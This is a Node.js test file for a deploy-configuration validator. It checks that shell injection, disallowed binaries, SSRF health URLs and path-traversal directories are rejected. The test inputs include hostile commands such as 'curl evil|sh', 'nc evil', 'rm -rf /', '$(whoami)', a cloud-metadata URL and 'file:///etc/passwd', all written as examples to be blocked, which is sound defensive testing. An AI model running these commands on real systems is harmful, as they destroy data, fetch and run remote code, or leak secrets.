// Story-Pipeline S5 — deploy.json loader/validator. These are the tests sr-security re-checks:
// the validator must REJECT every command-injection shape, every non-allow-listed / bash-sh /
// absolute-path binary, an SSRF/non-loopback health URL, and a `..`/absolute cwd; and network
// must DEFAULT false (only an explicit `true` opts in).
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import {
  validateDeployCmd, validateDeploy, loadDeploy, validateHealthUrl, validateCwd,
  ALLOWED_DEPLOY_BINS, DEFAULT_DEPLOY, DEFAULT_TIMEOUT_MS,
} from "../deploy-config.mjs";

// ── validateDeployCmd — accept valid argv ────────────────────────────────────
test("validateDeployCmd accepts an allow-listed argv array", () => {
  assert.deepEqual(validateDeployCmd(["npm", "run", "build"]).cmd, ["npm", "run", "build"]);
  assert.deepEqual(validateDeployCmd(["node", "scripts/deploy-preview.mjs"]).cmd, ["node", "scripts/deploy-preview.mjs"]);
  assert.deepEqual(validateDeployCmd(["npx", "some-deployer", "--preview"]).cmd, ["npx", "some-deployer", "--preview"]);
});

// ── validateDeployCmd — reject every bad shape (the #1 security surface) ──────
test("validateDeployCmd rejects a non-array / empty array", () => {
  assert.ok(validateDeployCmd("npm run build").error);
  assert.ok(validateDeployCmd({ 0: "npm" }).error);
  assert.ok(validateDeployCmd([]).error);
  assert.ok(validateDeployCmd(null).error);
});
test("validateDeployCmd REJECTS bash/sh and any non-allow-listed binary", () => {
  assert.ok(validateDeployCmd(["bash", "-c", "curl evil|sh"]).error);
  assert.ok(validateDeployCmd(["sh", "deploy.sh"]).error);
  assert.ok(validateDeployCmd(["curl", "https://evil"]).error);
  assert.ok(validateDeployCmd(["kubectl", "apply"]).error);
  assert.ok(validateDeployCmd(["rm", "-rf", "/"]).error);
});
test("validateDeployCmd rejects an absolute / relative path binary", () => {
  assert.ok(validateDeployCmd(["/bin/sh", "-c", "x"]).error);
  assert.ok(validateDeployCmd(["./deploy", "x"]).error);
  assert.ok(validateDeployCmd(["../npm", "run", "build"]).error);
  assert.ok(validateDeployCmd(["/usr/bin/node", "x"]).error);
});
test("validateDeployCmd rejects shell metacharacters in ANY element", () => {
  assert.ok(validateDeployCmd(["npm", "run", "build; curl evil"]).error);       // ;
  assert.ok(validateDeployCmd(["npm", "run", "build && rm -rf ~"]).error);       // &
  assert.ok(validateDeployCmd(["npm", "run", "build|nc evil 1"]).error);         // |
  assert.ok(validateDeployCmd(["npm", "run", "$(whoami)"]).error);               // $( )
  assert.ok(validateDeployCmd(["npm", "run", "`id`"]).error);                    // backtick
  assert.ok(validateDeployCmd(["npm", "run", "b\nrm"]).error);                   // newline
  assert.ok(validateDeployCmd(["npm", "run", "b\x00rm"]).error);               // NUL
});
test("validateDeployCmd rejects node dangerous flags (inline eval / preload)", () => {
  assert.ok(validateDeployCmd(["node", "-e", "process.exit"]).error);
  assert.ok(validateDeployCmd(["node", "--eval", "x"]).error);
  assert.ok(validateDeployCmd(["node", "-r", "./evil.js", "x"]).error);
  assert.ok(validateDeployCmd(["node", "--require", "./evil.js"]).error);
  assert.ok(validateDeployCmd(["node", "--import", "./evil.mjs"]).error);
  assert.ok(validateDeployCmd(["node", "--loader", "./evil.mjs"]).error);
  assert.ok(validateDeployCmd(["node", "--env-file", ".env"]).error);
  assert.ok(validateDeployCmd(["node", "--experimental-vm-modules", "x"]).error);
});

// ── validateHealthUrl — loopback-only (SSRF/exfil guard) ─────────────────────
test("validateHealthUrl accepts loopback http(s) and null", () => {
  assert.equal(validateHealthUrl(null).healthUrl, null);
  assert.equal(validateHealthUrl("").healthUrl, null);
  assert.ok(validateHealthUrl("http://localhost:3016/health").healthUrl);
  assert.ok(validateHealthUrl("http://127.0.0.1:8080/healthz").healthUrl);
  assert.ok(validateHealthUrl("https://localhost/ok").healthUrl);
});
test("validateHealthUrl REJECTS non-loopback hosts (SSRF), creds, and non-http schemes", () => {
  assert.ok(validateHealthUrl("http://169.254.169.254/latest/meta-data").error); // cloud metadata SSRF
  assert.ok(validateHealthUrl("http://evil.example.com/x").error);
  assert.ok(validateHealthUrl("http://10.0.0.5/x").error);
  assert.ok(validateHealthUrl("http://user:pass@localhost/x").error);            // embedded creds
  assert.ok(validateHealthUrl("file:///etc/passwd").error);
  assert.ok(validateHealthUrl("ftp://localhost/x").error);
  assert.ok(validateHealthUrl("not a url").error);
});

// ── validateCwd — relative subpath only ───────────────────────────────────────
test("validateCwd accepts a relative subdir and null; rejects absolute / .. ", () => {
  assert.equal(validateCwd(null).cwd, null);
  assert.equal(validateCwd("dist").cwd, "dist");
  assert.ok(validateCwd("/etc").error);
  assert.ok(validateCwd("../secrets").error);
  assert.ok(validateCwd("a/../../b").error);
  assert.ok(validateCwd("a; rm -rf").error);
});

// ── validateDeploy — network defaults false, timeout clamps ──────────────────
test("validateDeploy defaults network to false unless explicitly true", () => {
  assert.equal(validateDeploy({ deployCmd: ["npm", "run", "build"] }).config.network, false);
  assert.equal(validateDeploy({ deployCmd: ["npm", "run", "build"], network: false }).config.network, false);
  assert.equal(validateDeploy({ deployCmd: ["npm", "run", "build"], network: "true" }).config.network, false, "a string is not an opt-in");
  assert.equal(validateDeploy({ deployCmd: ["npm", "run", "build"], network: 1 }).config.network, false, "a truthy non-true is not an opt-in");
  assert.equal(validateDeploy({ deployCmd: ["npm", "run", "build"], network: true }).config.network, true, "explicit true opts in");
});
test("validateDeploy clamps timeout into [1s, 600s]", () => {
  assert.equal(validateDeploy({ deployCmd: ["npm", "run", "build"], timeoutMs: 5 }).config.timeoutMs, 1_000);
  assert.equal(validateDeploy({ deployCmd: ["npm", "run", "build"], timeoutMs: 9_999_999 }).config.timeoutMs, 600_000);
  assert.equal(validateDeploy({ deployCmd: ["npm", "run", "build"] }).config.timeoutMs, DEFAULT_TIMEOUT_MS);
});
test("validateDeploy rejects a bad deployCmd / healthUrl / cwd (fail closed)", () => {
  assert.ok(validateDeploy({ deployCmd: ["bash", "-c", "x"] }).error);
  assert.ok(validateDeploy({ deployCmd: ["npm", "run", "build"], healthUrl: "http://evil.com" }).error);
  assert.ok(validateDeploy({ deployCmd: ["npm", "run", "build"], cwd: "../x" }).error);
  assert.ok(validateDeploy(null).error);
  assert.ok(validateDeploy([1, 2]).error);
});

// ── loadDeploy — missing = default, present-bad = fail closed ────────────────
test("loadDeploy returns the safe default when the file is missing", () => {
  const r = loadDeploy(join(tmpdir(), "nope-deploy-" + Math.random() + ".json"));
  assert.deepEqual(r.config.deployCmd, DEFAULT_DEPLOY.deployCmd);
  assert.equal(r.config.network, false);
  assert.equal(r.config.healthUrl, null);
});
test("loadDeploy fails CLOSED on a present-but-poisoned file", () => {
  const dir = mkdtempSync(join(tmpdir(), "ma-deploycfg-"));
  try {
    const f = join(dir, "deploy.json");
    writeFileSync(f, JSON.stringify({ deployCmd: ["bash", "-c", "curl evil|sh"] }));
    assert.ok(loadDeploy(f).error, "a bash config is rejected, not run");
    writeFileSync(f, "{ not json");
    assert.ok(loadDeploy(f).error, "unparseable is rejected");
    writeFileSync(f, JSON.stringify({ deployCmd: ["npm", "run", "build"], network: true, healthUrl: "http://127.0.0.1:3016/health" }));
    const ok = loadDeploy(f);
    assert.equal(ok.config.network, true);
    assert.ok(ok.config.healthUrl);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test("ALLOWED_DEPLOY_BINS excludes bash/sh and DEFAULT_DEPLOY is itself valid", () => {
  assert.equal(ALLOWED_DEPLOY_BINS.has("bash"), false);
  assert.equal(ALLOWED_DEPLOY_BINS.has("sh"), false);
  assert.ok(validateDeploy(DEFAULT_DEPLOY).config, "the shipped default passes its own validator");
});
